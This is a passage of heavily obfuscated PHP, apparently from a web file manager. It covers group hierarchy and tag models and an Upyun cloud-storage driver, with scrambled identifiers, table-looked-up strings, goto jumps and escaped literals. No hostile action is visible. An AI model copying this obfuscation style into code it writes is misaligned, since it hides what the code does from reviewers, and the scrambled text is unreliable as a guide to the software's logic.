(isset($š–ñË«‘[$‘Ï’ôñ[$ì§×ò[1491]]])) { $‘Ï’ôñ[$ì§×ò[564]] = $š–ñË«‘[$‘Ï’ôñ[$ì§×ò[1491]]]; } } unset($‘Ï’ôñ); } protected function parentLevelArray($üìÈ³–ª) { $¡¾ÔŸ«Ê =& $_SERVER[øşô´çË]; $üìÈ³–ª = explode($¡¾ÔŸ«Ê[60], trim($üìÈ³–ª, $¡¾ÔŸ«Ê[60])); $üìÈ³–ª = array_remove_value($üìÈ³–ª, $¡¾ÔŸ«Ê[238]); return $üìÈ³–ª; } protected function parentInGroup($ß·¥ŞÌœ, $È™¸°»Â) { $İæôåˆ =& $_SERVER[øşô´çË]; $’ãÁ = $this->getInfoSimple($ß·¥ŞÌœ); if (!$’ãÁ) { return !0; } $ıŒª…Ç = $this->parentLevelArray($’ãÁ[$İæôåˆ[613]]); $ıŒª…Ç[] = $ß·¥ŞÌœ; foreach ($ıŒª…Ç as $ß·¥ŞÌœ) { if (in_array($ß·¥ŞÌœ . $İæôåˆ[12], $È™¸°»Â)) { return !0; } } return !1; } private function _listAppendParent(&$õÈÅ²ãŞ) { $Å§—¸ö =& $_SERVER[øşô´çË]; $ƒæ¦¥¿® = array(); foreach ($õÈÅ²ãŞ as &$÷©ÌºÅû) { $ƒæ¦¥¿®[$÷©ÌºÅû[$Å§—¸ö[1491]]] = $÷©ÌºÅû[$Å§—¸ö[42]]; $×®Çº‚ƒ = $this->parentLevelArray($÷©ÌºÅû[$Å§—¸ö[613]]); foreach ($×®Çº‚ƒ as $îÌ…) { if (!isset($ƒæ¦¥¿®[$îÌ…])) { $ƒæ¦¥¿®[$îÌ…] = 0; } } } unset($÷©ÌºÅû); foreach ($ƒæ¦¥¿® as $·á´¿Ú‹ => $ƒ½œªà) { if ($ƒ½œªà) { continue; } $ı‹¶êî = $this->getInfoSimple($·á´¿Ú‹); $ƒæ¦¥¿®[$·á´¿Ú‹] = $ı‹¶êî[$Å§—¸ö[42]]; } $áÖÌµœ = $GLOBALS[$Å§—¸ö[6]][$Å§—¸ö[102]][$Å§—¸ö[2285]]; if (KodUser::isRoot()) { $áÖÌµœ = !1; } foreach ($õÈÅ²ãŞ as &$÷©ÌºÅû) { $×®Çº‚ƒ = $this->parentLevelArray($÷©ÌºÅû[$Å§—¸ö[613]]); $ÜèüÂäÏ = $Å§—¸ö[12]; foreach ($×®Çº‚ƒ as $·á´¿Ú‹ => $îÌ…) { if ($áÖÌµœ && $·á´¿Ú‹ == 0) { continue; } $ÜèüÂäÏ .= $ƒæ¦¥¿®[$îÌ…] . $Å§—¸ö[8]; } if ($×®Çº‚ƒ) { $ÜèüÂäÏ .= $÷©ÌºÅû[$Å§—¸ö[42]]; } $÷©ÌºÅû[$Å§—¸ö[618]] = str_replace($Å§—¸ö[264], $Å§—¸ö[8], $ÜèüÂäÏ); } unset($÷©ÌºÅû); } private function _listAppendSourceRoot(&$®àÒ´Ã, $‹œã) { $øöîÙÖ =& $_SERVER[øşô´çË]; $å û¢Å = Model($øöîÙÖ[935])->listSourceRoot(SourceModel::TYPE_GROUP, $‹œã); $å û¢Å = array_to_keyvalue($å û¢Å, $øöîÙÖ[598]); $å û¢Å = array_remove_key($å û¢Å, $øöîÙÖ[598]); foreach ($®àÒ´Ã as &$» âŞé) { $» âŞé[$øöîÙÖ[100]] = $å û¢Å[$» âŞé[$øöîÙÖ[1491]]] ? $å û¢Å[$» âŞé[$øöîÙÖ[1491]]] : array(); } unset($» âŞé); } protected function groupMerge($É¿à¶¼Ö) { $É¿à¶¼Ö = array_values(array_unique($É¿à¶¼Ö)); $Á”¨€é® = array(); for ($º‹¶¯í¾ = 0; $º‹¶¯í¾ < count($É¿à¶¼Ö); $º‹¶¯í¾++) { $ßÍ”±½œ = !1; for ($ı•º¦¾– = 0; $ı•º¦¾– < count($É¿à¶¼Ö); $ı•º¦¾–++) { if ($º‹¶¯í¾ == $ı•º¦¾–) { continue; } if ($this->isParentOf($É¿à¶¼Ö[$ı•º¦¾–], $É¿à¶¼Ö[$º‹¶¯í¾])) { $ßÍ”±½œ = !0; break; } } if (!$ßÍ”±½œ) { $Á”¨€é®[] = $É¿à¶¼Ö[$º‹¶¯í¾]; } } return $Á”¨€é®; } protected function isParentOf($ÓıĞ¡â, $è…Í¨›) { $ğœ¼æ =& $_SERVER[øşô´çË]; if (!$ÓıĞ¡â || !$è…Í¨› || $ÓıĞ¡â == $è…Í¨›) { return !1; } $‚†æ§° = $this->getInfoSimple($ÓıĞ¡â); $›öÒÏ´à = $this->getInfoSimple($è…Í¨›); $ø¸øÅÏû = $‚†æ§°[$ğœ¼æ[613]] . $ÓıĞ¡â . $ğœ¼æ[60]; if (substr($›öÒÏ´à[$ğœ¼æ[613]], 0, strlen($ø¸øÅÏû)) == $ø¸øÅÏû) { return !0; } return !1; } public function groupShowRoot($»Œ‹É‚ƒ, $×õ Ç™— = false) { $ÒßˆĞÎÄ =& $_SERVER[øşô´çË]; $áµ–õ† = $this->getInfo($»Œ‹É‚ƒ); if (!$áµ–õ†) { return array(); } $½Ü’¥° = $this->parentLevelArray($áµ–õ†[$ÒßˆĞÎÄ[613]]); $ª‰‹ËŸ† = array($»Œ‹É‚ƒ); if (count($½Ü’¥°) == 0) { return $ª‰‹ËŸ†; } if ($×õ Ç™— && count($½Ü’¥°) == 1) { return $ª‰‹ËŸ†; } if (!$áµ–õ†[$ÒßˆĞÎÄ[564]] || !isset($áµ–õ†[$ÒßˆĞÎÄ[564]][$ÒßˆĞÎÄ[2266]]) || $áµ–õ†[$ÒßˆĞÎÄ[564]][$ÒßˆĞÎÄ[2266]] == $ÒßˆĞÎÄ[946]) { return $this->groupShowRoot($½Ü’¥°[count($½Ü’¥°) - 1], $×õ Ç™—); } if ($áµ–õ†[$ÒßˆĞÎÄ[564]][$ÒßˆĞÎÄ[2266]] == $ÒßˆĞÎÄ[441]) { $æÎ«êñ¾ = explode($ÒßˆĞÎÄ[60], $áµ–õ†[$ÒßˆĞÎÄ[564]][$ÒßˆĞÎÄ[2267]]); if ($æÎ«êñ¾) { $ª‰‹ËŸ† = array_merge($ª‰‹ËŸ†, $æÎ«êñ¾); } } return $ª‰‹ËŸ†; } protected function resetParentLevel() { $Ó­×õ Ñ =& $_SERVER[øşô´çË]; $ Û¸’åó = $Ó­×õ Ñ[1491]; $‡÷¡œÕ“ = $this->select(); $‡÷¡œÕ“ = array_to_keyvalue($‡÷¡œÕ“, $ Û¸’åó); foreach ($‡÷¡œÕ“ as $çÕçô–È) { $Âó½¯µğ = $çÕçô–È; $Áøûúêº = array(); while ($Âó½¯µğ[$Ó­×õ Ñ[200]] != 0) { $Áøûúêº[] = $Âó½¯µğ[$Ó­×õ Ñ[200]]; $Âó½¯µğ = $‡÷¡œÕ“[$Âó½¯µğ[$Ó­×õ Ñ[200]]]; } $Áøûúêº[] = 0; $Áøûúêº = $Ó­×õ Ñ[60] . implode($Ó­×õ Ñ[60], array_reverse($Áøûúêº)) . $Ó­×õ Ñ[60]; $this->setNamePinyin($çÕçô–È[$ Û¸’åó], $çÕçô–È[$Ó­×õ Ñ[42]]); $this->where(array($ Û¸’åó => $çÕçô–È[$ Û¸’åó]))->save(array($Ó­×õ Ñ[683] => $Áøûúêº)); } return $‡÷¡œÕ“; } public function groupNameAuto($×»şœğŒ, $Ğ±åöÂ) { $¾¨ÎÌò =& $_SERVER[øşô´çË]; $Ö—åì” = $this->where(array($¾¨ÎÌò[501] => $×»şœğŒ))->getField($¾¨ÎÌò[42], !0); if (!$Ö—åì” || !in_array($Ğ±åöÂ, $Ö—åì”)) { return $Ğ±åöÂ; } for ($Ùö‡Æ¬ç = 1; $Ùö‡Æ¬ç <= count($Ö—åì”) + 1; $Ùö‡Æ¬ç++) { $¶â“ùĞí = $Ğ±åöÂ . "\50{$Ùö‡Æ¬ç}\51"; if (!in_array($¶â“ùĞí, $Ö—åì”)) { return $¶â“ùĞí; } } } public function groupSwitch($´éÂÃÎ¬, $±ÈÖ¹›®) { $¬ç¹‰„ =& $_SERVER[øşô´çË]; $‘ÁÑ‚ßã = array($¬ç¹‰„[1491] => array($¬ç¹‰„[7], array($´éÂÃÎ¬, $±ÈÖ¹›®))); $ÜÌİ–À = $this->where($‘ÁÑ‚ßã)->select(); $ÜÌİ–À = array_to_keyvalue($ÜÌİ–À, $¬ç¹‰„[1491]); $­×°–øÃ = _get($ÜÌİ–À, $´éÂÃÎ¬); $Ëğ¿ó·  = _get($ÜÌİ–À, $±ÈÖ¹›®); if (!$­×°–øÃ || !$Ëğ¿ó·  || $­×°–øÃ[$¬ç¹‰„[200]] == 0) { return !1; } if ($­×°–øÃ[$¬ç¹‰„[1491]] == $Ëğ¿ó· [$¬ç¹‰„[1491]]) { return !1; } if (strpos($Ëğ¿ó· [$¬ç¹‰„[613]], $­×°–øÃ[$¬ç¹‰„[613]] . $­×°–øÃ[$¬ç¹‰„[1491]] . $¬ç¹‰„[60]) === 0) { return !1; } $‘ÁÑ‚ßã = array($¬ç¹‰„[1491] => $´éÂÃÎ¬); $Æ¸€¨–› = Model($¬ç¹‰„[2272])->where($‘ÁÑ‚ßã)->select(); if (!$Æ¸€¨–›) { $Æ¸€¨–› = array(); } foreach ($Æ¸€¨–› as $Ÿ¬ë…¬) { $ÊÌäÄœŠ = $Ÿ¬ë…¬[$¬ç¹‰„[1588]]; $‘ÁÑ‚ßã = array($¬ç¹‰„[1588] => $ÊÌäÄœŠ, $¬ç¹‰„[1491] => $±ÈÖ¹›®); $´Ó´ºŠÈ = Model($¬ç¹‰„[2272])->where($‘ÁÑ‚ßã)->find(); if (!$´Ó´ºŠÈ) { $ÄÅğş˜ = array($±ÈÖ¹›® => $Ÿ¬ë…¬[$¬ç¹‰„[1636]]); Model($¬ç¹‰„[626])->userGroupAdd($ÊÌäÄœŠ, $ÄÅğş˜); } Model($¬ç¹‰„[626])->userGroupRemove($ÊÌäÄœŠ, $´éÂÃÎ¬); } $‘ÁÑ‚ßã = array($¬ç¹‰„[198] => 2, $¬ç¹‰„[200] => 0, $¬ç¹‰„[509] => 1, $¬ç¹‰„[598] => array($¬ç¹‰„[7], array($´éÂÃÎ¬, $±ÈÖ¹›®))); $Õ¤Ú›Â™ = Model($¬ç¹‰„[935])->where($‘ÁÑ‚ßã)->field($¬ç¹‰„[2286])->select(); $Õ¤Ú›Â™ = array_to_keyvalue($Õ¤Ú›Â™, $¬ç¹‰„[598], $¬ç¹‰„[201]); $¡€ôš Î = !empty($Õ¤Ú›Â™[$´éÂÃÎ¬]) ? $Õ¤Ú›Â™[$´éÂÃÎ¬] : !1; if ($¡€ôš Î) { if (!$Õ¤Ú›Â™[$±ÈÖ¹›®]) { $Õ¤Ú›Â™[$±ÈÖ¹›®] = Model($¬ç¹‰„[935])->groupRootAdd($±ÈÖ¹›®); } $Í««ì†Ñ = $Õ¤Ú›Â™[$±ÈÖ¹›®]; $‘ÁÑ‚ßã = array($¬ç¹‰„[200] => $¡€ôš Î); $Õ¤Ú›Â™ = Model($¬ç¹‰„[935])->where($‘ÁÑ‚ßã)->field($¬ç¹‰„[2287])->select(); if (!$Õ¤Ú›Â™) { $Õ¤Ú›Â™ = array(); } Model($¬ç¹‰„[935])->moveClearAuth = !1; foreach ($Õ¤Ú›Â™ as $›áÃ×€) { $—­†õ¨ğ = $›áÃ×€[$¬ç¹‰„[509]] == $¬ç¹‰„[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¬ç¹‰„[935])->move($›áÃ×€[$¬ç¹‰„[201]], $Í««ì†Ñ, $—­†õ¨ğ); } Model($¬ç¹‰„[935])->moveClearAuth = !0; $‘ÁÑ‚ßã = array($¬ç¹‰„[198] => 2, $¬ç¹‰„[598] => $´éÂÃÎ¬); $ªì£ï­ = array($¬ç¹‰„[598] => $±ÈÖ¹›®); Model($¬ç¹‰„[2288])->where($‘ÁÑ‚ßã)->save($ªì£ï­); Model($¬ç¹‰„[2289])->where($‘ÁÑ‚ßã)->save($ªì£ï­); } $this->_changeChildLevel($ÜÌİ–À[$´éÂÃÎ¬], $ÜÌİ–À[$±ÈÖ¹›®], !0); $this->where(array($¬ç¹‰„[200] => $´éÂÃÎ¬))->save(array($¬ç¹‰„[200] => $±ÈÖ¹›®)); $this->_clearChildrenCache($ÜÌİ–À[$±ÈÖ¹›®]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($Ë‚Ç€‡ß) { $öªéÔÄÎ =& $_SERVER[øşô´çË]; return array($öªéÔÄÎ[2290] => array($Ë‚Ç€‡ß[0], $öªéÔÄÎ[2291]), $öªéÔÄÎ[2292] => array($Ë‚Ç€‡ß[0], $öªéÔÄÎ[2293])); } protected function ___get($úº‘Õ­Ã) { $öĞ–É£è =& $_SERVER[øşô´çË]; $ŸèÚÖÑ = Model($öĞ–É£è[614])->metaGet($úº‘Õ­Ã, $öĞ–É£è[2294]); $ÂÅ½›Ô¾ = json_decode($ŸèÚÖÑ, !0); return $ÂÅ½›Ô¾ ? $ÂÅ½›Ô¾ : array($öĞ–É£è[2295] => $öĞ–É£è[101], $öĞ–É£è[455] => array()); } protected function ___listData($€øûªÒ‚) { $´ˆ–¹÷ =& $_SERVER[øşô´çË]; $Ôƒ…º¡ = array($´ˆ–¹÷[1964] => 0, $´ˆ–¹÷[582] => array($´ˆ–¹÷[2296], 0), $´ˆ–¹÷[520] => $´ˆ–¹÷[1487] . $€øûªÒ‚); $Ê‹à…ñ¥ = $´ˆ–¹÷[2297]; $¤¡²˜¶Î = $this->field($Ê‹à…ñ¥)->where($Ôƒ…º¡)->order($´ˆ–¹÷[2298])->select(); return $¤¡²˜¶Î ? $¤¡²˜¶Î : array(); } protected function set($ô—õÇœ³, $ÂÛÌÖıï) { $ü§†ĞÎ÷ =& $_SERVER[øşô´çË]; $ÂÛÌÖıï = $ÂÛÌÖıï ? $ÂÛÌÖıï : array($ü§†ĞÎ÷[2295] => $ü§†ĞÎ÷[101], $ü§†ĞÎ÷[455] => array()); return Model($ü§†ĞÎ÷[614])->metaSet($ô—õÇœ³, $ü§†ĞÎ÷[2294], json_encode($ÂÛÌÖıï)); } protected function getByTagID($Ú’é ûÈ, $öÈØÃ£) { $ÍõË–ÇÈ =& $_SERVER[øşô´çË]; if (!$Ú’é ûÈ || !$öÈØÃ£) { return !1; } if (!Model($ÍõË–ÇÈ[614])->getInfoSimple($Ú’é ûÈ)) { return !1; } $©èÆ‚Ìç = $this->get($Ú’é ûÈ); if (!$©èÆ‚Ìç || !isset($©èÆ‚Ìç[$ÍõË–ÇÈ[455]])) { return !1; } $â»½ß’µ = array_find_by_field($©èÆ‚Ìç[$ÍõË–ÇÈ[455]], $ÍõË–ÇÈ[496], $öÈØÃ£); return is_array($â»½ß’µ) ? $â»½ß’µ : !1; } public function listSource($¾–„ª®, $î†ˆ¯ìÅ) { $“¨äÙƒ’ =& $_SERVER[øşô´çË]; if ($î†ˆ¯ìÅ && !is_array($î†ˆ¯ìÅ)) { $î†ˆ¯ìÅ = array($î†ˆ¯ìÅ); } $˜ÂÔñ…â = $this->get($¾–„ª®); $¶ÙÉ®¡Õ = array_to_keyvalue($˜ÂÔñ…â[$“¨äÙƒ’[455]], $“¨äÙƒ’[496]); $ñüì·Œ = array_to_keyvalue($˜ÂÔñ…â[$“¨äÙƒ’[607]], $“¨äÙƒ’[496]); $Æ÷åƒ¡â = $this->listData($¾–„ª®); $ìóš–…© = array(); foreach ($î†ˆ¯ìÅ as $­æ¶ß§) { $¼ÄäÉêŠ = $¶ÙÉ®¡Õ[$­æ¶ß§]; $õÀ³…Ş‰ = _get($¼ÄäÉêŠ, $“¨äÙƒ’[607]); if (!$¼ÄäÉêŠ || !$õÀ³…Ş‰ || !$ñüì·Œ[$õÀ³…Ş‰]) { continue; } if (!$ìóš–…©[$õÀ³…Ş‰]) { $ìóš–…©[$õÀ³…Ş‰] = array(); } $ìóš–…©[$õÀ³…Ş‰][] = $­æ¶ß§; } $«àŸş = array(); $†‰µŠ· = array(); foreach ($Æ÷åƒ¡â as $¨ÜÏ¼×¬) { $°æûœÆ£ = $¨ÜÏ¼×¬[$“¨äÙƒ’[97]]; $¼ÄäÉêŠ = $¶ÙÉ®¡Õ[$¨ÜÏ¼×¬[$“¨äÙƒ’[524]]]; $õÀ³…Ş‰ = _get($¼ÄäÉêŠ, $“¨äÙƒ’[607]); if (!$¼ÄäÉêŠ || !$õÀ³…Ş‰ || !$ìóš–…©[$õÀ³…Ş‰] || !$°æûœÆ£) { continue; } if (!in_array($¨ÜÏ¼×¬[$“¨äÙƒ’[524]], $ìóš–…©[$õÀ³…Ş‰])) { continue; } if (!$«àŸş[$°æûœÆ£]) { $«àŸş[$°æûœÆ£] = array(); } $«àŸş[$°æûœÆ£][] = $õÀ³…Ş‰; } foreach ($«àŸş as $°æûœÆ£ => $·…ü›»é) { if (count($·…ü›»é) != count($ìóš–…©)) { continue; } $†‰µŠ·[] = $°æûœÆ£; } if (!$î†ˆ¯ìÅ) { $†‰µŠ· = array_to_keyvalue($Æ÷åƒ¡â, $“¨äÙƒ’[12], $“¨äÙƒ’[97]); } $†‰µŠ· = array_unique($†‰µŠ·); if (!$†‰µŠ·) { return array(); } $ ‰Â“Œ = array($“¨äÙƒ’[515] => array($“¨äÙƒ’[516], $†‰µŠ·), $“¨äÙƒ’[598] => $¾–„ª®, $“¨äÙƒ’[198] => SourceModel::TYPE_GROUP); $Í¢ø³éæ = Model($“¨äÙƒ’[1529])->listSource($ ‰Â“Œ); if (!$Í¢ø³éæ || count($†‰µŠ·) == $Í¢ø³éæ[$“¨äÙƒ’[452]][$“¨äÙƒ’[453]]) { return $Í¢ø³éæ; } $´±ßâ«º = array(); $ÍÍ„–â¥ = array_to_keyvalue($Í¢ø³éæ[$“¨äÙƒ’[95]], $“¨äÙƒ’[12], $“¨äÙƒ’[201]); $ÓÇÎ = array_to_keyvalue($Í¢ø³éæ[$“¨äÙƒ’[96]], $“¨äÙƒ’[12], $“¨äÙƒ’[201]); $˜í°­š™ = array_merge($ÓÇÎ, $ÍÍ„–â¥); foreach ($†‰µŠ· as $°æûœÆ£) { if (!in_array($°æûœÆ£, $˜í°­š™)) { $´±ßâ«º[] = $°æûœÆ£; } } if ($´±ßâ«º) { $this->removeBySource($¾–„ª®, $´±ßâ«º); } return $Í¢ø³éæ; } protected function addToTag($Ì³›Æ, $şÒï¡Ò, $æÜ¿×ş©) { $ÁŒâ†· =& $_SERVER[øşô´çË]; if (!$this->getByTagID($Ì³›Æ, $æÜ¿×ş©) || !$şÒï¡Ò) { return !1; } if (!Model($ÁŒâ†·[935])->pathInfo($şÒï¡Ò)) { return !1; } $±Æ‰Ê‘§ = array($ÁŒâ†·[1964] => 0, $ÁŒâ†·[582] => $æÜ¿×ş©, $ÁŒâ†·[519] => $şÒï¡Ò, $ÁŒâ†·[520] => $ÁŒâ†·[2299] . $Ì³›Æ, $ÁŒâ†·[518] => $ÁŒâ†·[12], $ÁŒâ†·[2182] => 0); if ($this->where($±Æ‰Ê‘§)->find()) { return !1; } return $this->add($±Æ‰Ê‘§); } protected function removeFromTag($ÇŒèï£‘, $°÷äüğŒ, $ïõÑş¶ú) { $Õß÷Öªõ =& $_SERVER[øşô´çË]; if (!$this->getByTagID($ÇŒèï£‘, $ïõÑş¶ú) || !$°÷äüğŒ) { return !1; } if (is_array($°÷äüğŒ)) { $°÷äüğŒ = array($Õß÷Öªõ[7], $°÷äüğŒ); } $àß¿‡¢ç = array($Õß÷Öªõ[1964] => 0, $Õß÷Öªõ[582] => $ïõÑş¶ú, $Õß÷Öªõ[520] => $Õß÷Öªõ[2299] . $ÇŒèï£‘, $Õß÷Öªõ[519] => $°÷äüğŒ); return $this->where($àß¿‡¢ç)->delete(); } protected function removeByTag($¡¢“ÙÕ, $§´°şçŒ) { $‹ï»ûíŸ =& $_SERVER[øşô´çË]; if (!$this->getByTagID($¡¢“ÙÕ, $§´°şçŒ)) { return !1; } $¯ŠÏ‡¿Ó = array($‹ï»ûíŸ[1964] => 0, $‹ï»ûíŸ[582] => $§´°şçŒ, $‹ï»ûíŸ[520] => $‹ï»ûíŸ[2299] . $¡¢“ÙÕ); return $this->where($¯ŠÏ‡¿Ó)->delete(); } protected function removeBySource($öÅ‚Ù»É, $ÅŞî¡±ƒ) { $†­âğ¦ß =& $_SERVER[øşô´çË]; if (!$öÅ‚Ù»É || !$ÅŞî¡±ƒ) { return !1; } if (is_array($ÅŞî¡±ƒ)) { $ÅŞî¡±ƒ = array($†­âğ¦ß[7], $ÅŞî¡±ƒ); } $ƒÙ´¦„ = array($†­âğ¦ß[1964] => 0, $†­âğ¦ß[519] => $ÅŞî¡±ƒ, $†­âğ¦ß[582] => array($†­âğ¦ß[1178], 0), $†­âğ¦ß[520] => $†­âğ¦ß[2299] . $öÅ‚Ù»É); return $this->where($ƒÙ´¦„)->delete(); } } goto f„¹ñ™Ò¶»; fñõ‘ã‹Ñï: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\x2f\x2f\x76\60\56\141\160\x69\56\x75\160\171\165\156\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¨Ä¤¦ÙÆ) { parent::__construct(); $this->_init($¨Ä¤¦ÙÆ); } public function _init($è•ÎÌüí) { $¾¾²Ê¥æ =& $_SERVER[øşô´çË]; foreach ($è•ÎÌüí as $ˆ™»³×Ä => $şï¿æ±¯) { if (isset($this->{$ˆ™»³×Ä})) { $this->{$ˆ™»³×Ä} = $şï¿æ±¯; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¾¾²Ê¥æ[1745] . LNG($¾¾²Ê¥æ[1668])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($æ“Š®Ï¹, $Ù¾ä„Ÿ€ = "\107\105\124") { $ĞÅ¨Äİ˜ =& $_SERVER[øşô´çË]; $æ©íÇÏ­ = gmdate($ĞÅ¨Äİ˜[1697]); $½ºÎ”’ = base64_encode(hash_hmac($ĞÅ¨Äİ˜[1746], "{$Ù¾ä„Ÿ€}\46{$æ“Š®Ï¹}\46{$æ©íÇÏ­}", md5("{$this->userpass}"), !0)); $í¦šáüç = array("\101\165\164\150\x6f\x72\151\x7a\141\x74\151\157\156\72\125\120\131\125\x4e\40{$this->username}\72{$½ºÎ”’}", "\104\141\164\145\x3a{$æ©íÇÏ­}"); return $í¦šáüç; } public function ussRequest($™±âçÉ, $â‰ìÒğ = "\x47\105\x54", $êúª‚œ = false, $±íí¢ı  = false, $ŸŞïâËš = false) { $–¸˜ğñÈ =& $_SERVER[øşô´çË]; $™±âçÉ = trim($™±âçÉ, $–¸˜ğñÈ[8]); $™×š‹àÍ = "\57{$this->bucket}\x2f" . rawurlencode($™±âçÉ); $á²“éûÍ = $this->ussHeaders($™×š‹àÍ, $â‰ìÒğ); if ($±íí¢ı ) { $á²“éûÍ = array_merge($á²“éûÍ, $±íí¢ı ); } $ó¬ïıª = url_request($this->endpoint . $™×š‹àÍ, $â‰ìÒğ, $êúª‚œ, $á²“éûÍ, $ŸŞïâËš); if (!$ó¬ïıª) { $ÛÜ‘Òçš = LNG($–¸˜ğñÈ[1747]); $this->writeLog($ÛÜ‘Òçš); return array($–¸˜ğñÈ[1398] => !1, $–¸˜ğñÈ[1388] => $ÛÜ‘Òçš); } if (strtolower($â‰ìÒğ) == $–¸˜ğñÈ[237] || in_array($ó¬ïıª[$–¸˜ğñÈ[1398]], array($–¸˜ğñÈ[271], $–¸˜ğñÈ[1748]))) { $êúª‚œ = $ó¬ïıª[$–¸˜ğñÈ[1749]]; if (!$ó¬ïıª[$–¸˜ğñÈ[852]]) { $êúª‚œ = isset($êúª‚œ[0]) ? $êúª‚œ[0] : $–¸˜ğñÈ[12]; } } else { $êúª‚œ = json_decode($ó¬ïıª[$–¸˜ğñÈ[1388]], !0); if (!$êúª‚œ) { $êúª‚œ = $ó¬ïıª[$–¸˜ğñÈ[1388]]; } else { if (!$ó¬ïıª[$–¸˜ğñÈ[852]] && isset($êúª‚œ[$–¸˜ğñÈ[1750]])) { $êúª‚œ = $êúª‚œ[$–¸˜ğñÈ[1750]]; } } } if (!$ó¬ïıª[$–¸˜ğñÈ[852]]) { $this->writeLog($this->__errorMessage($êúª‚œ)); } return array($–¸˜ğñÈ[1398] => $ó¬ïıª[$–¸˜ğñÈ[852]], $–¸˜ğñÈ[1388] => $êúª‚œ); } private function __errorMessage($ªˆ¡‘û®) { $¶šáÏ›ä =& $_SERVER[øşô´çË]; if (!$ªˆ¡‘û®) { return $¶šáÏ›ä[12]; } static $“üÍ±ü = null; if (!$“üÍ±ü) { $“üÍ±ü = I18n::getType(); } if ($“üÍ±ü != $¶šáÏ›ä[1705]) { return $ªˆ¡‘û®; } $üÍ§˜×Ú = array($¶šáÏ›ä[1751] => $¶šáÏ›ä[1752], $¶šáÏ›ä[1753] => $¶šáÏ›ä[1754], $¶šáÏ›ä[1755] => $¶šáÏ›ä[1754], $¶šáÏ›ä[1756] => $¶šáÏ›ä[1757], $¶šáÏ›ä[1758] => $¶šáÏ›ä[1759], $¶šáÏ›ä[1760] => $¶šáÏ›ä[1761], $¶šáÏ›ä[1762] => $¶šáÏ›ä[1763]); return isset($üÍ§˜×Ú[$ªˆ¡‘û®]) ? $üÍ§˜×Ú[$ªˆ¡‘û®] : $ªˆ¡‘û®; } public function mkfile($ŸíâŠîÑ, $¢ü«à¶Œ = '', $µıÑ¤øÃ = REPEAT_RENAME) { if ($this->setContent($ŸíâŠîÑ, $¢ü«à¶Œ)) { return $this->getPathOuter($ŸíâŠîÑ); } return !1; } public function mkdir($ë³ã§óŠ, $Ñ®š­¡¤ = REPEAT_SKIP) { $Û˜âµû¯ =& $_SERVER[øşô´çË]; $ì¿óÕëÎ = trim($ë³ã§óŠ, $Û˜âµû¯[8]); if ($this->_isFolder($ì¿óÕëÎ)) { return $this->getPathOuter($ì¿óÕëÎ); } $úı‰¬»¡ = array($Û˜âµû¯[1764]); $”×‘¼ÀÄ = $this->ussRequest($ì¿óÕëÎ, $Û˜âµû¯[297], !1, $úı‰¬»¡); return $”×‘¼ÀÄ[$Û˜âµû¯[1398]] ? $this->getPathOuter($ì¿óÕëÎ) : !1; } public function copyFile($†ƒşãÆ½, $¸›ÃÎÜÖ) { $„»¹Ïš— =& $_SERVER[øşô´çË]; $åÑËÉñ¹ = array($„»¹Ïš—[1765] . "\57{$this->bucket}\57{$†ƒşãÆ½}", $„»¹Ïš—[1766]); $÷ÓŠƒİª = $this->ussRequest($¸›ÃÎÜÖ, $„»¹Ïš—[263], !1, $åÑËÉñ¹); return $÷ÓŠƒİª[$„»¹Ïš—[1398]] ? !0 : $this->getPathOuter($¸›ÃÎÜÖ); } public function moveFile($øÄ½·¿, $©§®è˜) { $×ë °Ç =& $_SERVER[øşô´çË]; $ÇÎŒ¤– = array($×ë °Ç[1767] . "\x2f{$this->bucket}\x2f{$øÄ½·¿}", $×ë °Ç[1766]); $­ÃĞ×’× = $this->ussRequest($©§®è˜, $×ë °Ç[263], !1, $ÇÎŒ¤–); return $­ÃĞ×’×[$×ë °Ç[1398]] ? !0 : $this->getPathOuter($©§®è˜); } public function delFile($±‹‡·á˜) { $àšå¿Š =& $_SERVER[øşô´çË]; $Ê§Ó—Ïá = $this->ussRequest($±‹‡·á˜, $àšå¿Š[1768]); return $Ê§Ó—Ïá[$àšå¿Š[1398]] ? !0 : !1; } public function delFolder($Œ‰“î±Ú) { $¨„®õ¢¦ =& $_SERVER[øşô´çË]; if (!$this->exist($Œ‰“î±Ú)) { return !0; } $this->listItemCache = !1; $àÅ›È = $‰¹î¯Ã¢ = array(); $this->fileList($Œ‰“î±Ú, $àÅ›È, $‰¹î¯Ã¢, !0); $this->listItemCache = !0; foreach ($‰¹î¯Ã¢ as $”ï„ƒú²) { $†ÓÊ‘ê° = $this->ussRequest($”ï„ƒú²[$¨„®õ¢¦[42]], $¨„®õ¢¦[1768]); if (!$†ÓÊ‘ê°[$¨„®õ¢¦[1398]]) { return !1; } } usort($àÅ›È, function ($†Åíí„, $ ÒöÇ¯Ê) { $¥‡«Ûä™ =& $_SERVER[øşô´çË]; return substr_count($ ÒöÇ¯Ê, $¥‡«Ûä™[8]) - substr_count($†Åíí„, $¥‡«Ûä™[8]); }); foreach ($àÅ›È as $Ÿ¯ºá¢ç) { $†ÓÊ‘ê° = $this->ussRequest($Ÿ¯ºá¢ç, $¨„®õ¢¦[1768]); if (!$†ÓÊ‘ê°[$¨„®õ¢¦[1398]]) { return !1; } } $†ÓÊ‘ê° = $this->ussRequest($Œ‰“î±Ú, $¨„®õ¢¦[1768]); return $†ÓÊ‘ê°[$¨„®õ¢¦[1398]]; } public function rename($Òä‚“Ø, $Ñ×«ğ¢Ç) { if ($this->isFile($Òä‚“Ø)) { $Ñ×«ğ¢Ç = get_path_father($Òä‚“Ø) . $Ñ×«ğ¢Ç; return $this->moveFile($Òä‚“Ø, $Ñ×«ğ¢Ç); } return $this->renameObject($Òä‚“Ø, $Ñ×«ğ¢Ç); } public function fileInfo($‹‹ï±•, $üí˜°·£ = false, $µ”İá–å = array()) { $ˆ·Ö»»Ó =& $_SERVER[øşô´çË]; $ÙîÛ„© = array($ˆ·Ö»»Ó[42] => $this->pathThis($‹‹ï±•), $ˆ·Ö»»Ó[97] => $this->getPathOuter($ˆ·Ö»»Ó[8] . $‹‹ï±•), $ˆ·Ö»»Ó[43] => $ˆ·Ö»»Ó[240], 